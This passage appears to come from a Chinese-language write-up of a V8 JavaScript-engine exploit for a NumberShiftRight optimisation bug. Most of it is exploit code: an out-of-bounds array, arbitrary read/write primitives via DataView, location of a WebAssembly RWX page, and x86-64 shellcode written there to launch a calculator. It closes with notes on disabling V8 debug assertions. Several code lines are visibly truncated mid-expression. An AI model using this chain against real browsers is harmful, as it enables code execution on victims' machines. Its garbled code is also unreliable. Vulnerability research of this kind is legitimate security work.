    }
    function gc()
    {
        for(let i=0;i>= 16;
        idx *= 7;
        // print(idx);
        let oobArray = [1.0,1.1,1.2,1.3];
        // return oobArray[idx];
        // print(oobArray[idx])
        oobArray[idx] = 1.74512933848984e-310;//i2f(0x202000000000);
        return oobArray;
    }
    let f_arr = [1.0];
    let arr = [1.0,1.1];
    arr.length = 1'+hex(oob.length));
    %SystemBreak();
修改之后的结果
####  3.2 任意地址写 && 泄露地址
首先利用上面数组的oob 找到相关的位置
代码如下
    let off_buf;
    let off_obj;
    for(var i=0;i'+off_obj);
    console.log('[*]  off_buf======>'+off_buf);
    // %SystemBreak();
运行结果
接着尝试写函数实现任意地址写 原语addrof
    let dataView = new DataView(abf[0]);
    function abread(addr)
    {
        oob[off_buf] = i2f(addr);
        return f2i(dataView.getFloat64(0,true));
    }
    function abwrite(addr,payload)
    {
        oob[off_buf] = i2f(addr);
        for(var i=0;i 0x"+f_addr.toString(16));
    let share_info_addr = abread(f_addr + 0x18) - 1;
    console.log("share_info ==> 0x"+share_info_addr.toString(16));
    // %SystemBreak();
    // readline();
    let wasm = abread(share_info_addr + 8) - 1;
    console.log("wasm ==> 0x"+wasm.toString(16));
    let instance=abread(wasm+0x10) -1;
    console.log("instance ==> 0x"+instance.toString(16));
    // readline()
    let rwx_addr=abread(instance+0xe8)
    console.log("rwx_addr ==> 0x"+rwx_addr.toString(16));
    var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
        96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
        105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
        72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
        72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
        184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
        94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
    abwrite(rwx_addr, shellcode);
    f();
最终结果
## 4 参考
写POC之前没有找到参考文章,后来遇到NumberShiftRight问题之后,发现了sakura师傅的文章
 ☜ 👍 主要参考了优化分析部分
## 5 技巧
####  5.1
帮助分析优化的流程
—trace-turbo-reduction
####  5.2
关于Debug Check
在Debug模式下,即便我们绕过了checkBound节点,运行的时候仍然会其他的check,不利于之后的调试(假设后面出了问题不容易发现)
于是根据Debug模式下的报错信息,记录一下修改源码中其他check的地方
首先运行一下脚本,查看check的位置
下面两处是一个文件的两个地方
找到源码位置注释掉重新编译 记得重新编译 (另外可能不同版本v8注释的地方不同)
src/code-stub-assembler.cc
      // CSA_ASSERT(this, IsOffsetInBounds(
      //                      offset, LoadAndUntagFixedArrayBaseLength(object),
      //                      FixedDoubleArray::kHeaderSize, HOLEY_DOUBLE_ELEMENTS));
src/objects/fixed-array-inl.h
      // DCHECK(index >= 0 && index length());
src/code-stub-assembler.cc
        // IntPtrAdd does constant-folding automatically.
        return;
        // TNode effective_index =
        //     IntPtrAdd(UncheckedCast(index),
        //               IntPtrConstant(additional_offset / kPointerSize));
        // CSA_CHECK(this, UintPtrLessThan(effective_index,
        //                                 LoadAndUntagFixedArrayBaseLength(array)));
上面就是改动的所有部分
一波修改之后 debug模式下成功弹出计算器
####  5.3
MARK!!!  
调试源码中的优化部分
正常跑起代码之后
在想要停止的地方下端点
之后停在了指定位置并且可以在指定的位置查看信息(print)
这个很重要，会调试源码之后才能更好的了解优化的流程